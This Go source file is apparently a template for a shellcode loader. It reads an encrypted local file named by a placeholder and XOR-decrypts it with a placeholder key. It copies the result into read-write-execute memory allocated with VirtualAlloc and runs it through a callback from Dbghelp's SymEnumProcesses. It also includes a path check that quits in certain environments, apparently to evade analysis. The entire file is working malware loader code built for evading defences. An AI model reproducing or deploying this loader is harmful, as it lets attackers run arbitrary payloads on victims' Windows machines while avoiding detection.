package main

import (
	"os"
	"syscall"
	"unsafe"
)

var (
	timer int
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	FALSE                  = 0
)

var (
	kernel32          = syscall.NewLazyDLL("kernel32.dll")
	ntdll             = syscall.NewLazyDLL("ntdll.dll")
	Dbghelp           = syscall.NewLazyDLL("Dbghelp.dll")
	VirtualAlloc      = kernel32.NewProc("VirtualAlloc")
	GetCurrentProcess = kernel32.NewProc("GetCurrentProcess")
	SymInitialize     = Dbghelp.NewProc("SymInitialize")
	SymEnumProcesses  = Dbghelp.NewProc("SymEnumProcesses")
	RtlMoveMemory     = ntdll.NewProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	Proces, _, _ := GetCurrentProcess.Call()
	SymInitialize.Call(Proces, 0, FALSE)
	SymEnumProcesses.Call(addr, 0)
}

func XorDecrypt(plaintext []byte, key []byte) []byte {
	ciphertext := make([]byte, len(plaintext))
	keyLength := len(key)
	for i, byte := range plaintext {
		keyByte := key[i%keyLength]
		encryptedByte := byte ^ keyByte
		ciphertext[i] = encryptedByte
	}
	return ciphertext
}

func DecryptData(shellcode []byte) []byte {
	key := []byte{{{Key}}}
	decryptShellcode := XorDecrypt(shellcode, key)
	return decryptShellcode
}

func main() {
	args := os.Args[0]
	if args[10] == 92 && (args[0] == 99 || args[0] == 67) {
		os.Exit(0)
	}

	ciphertext, err := os.ReadFile("{{LOCAL_FILENAME}}")
	if err != nil {
		return
	}
	byteData := DecryptData(ciphertext)
	Callback(byteData)
}
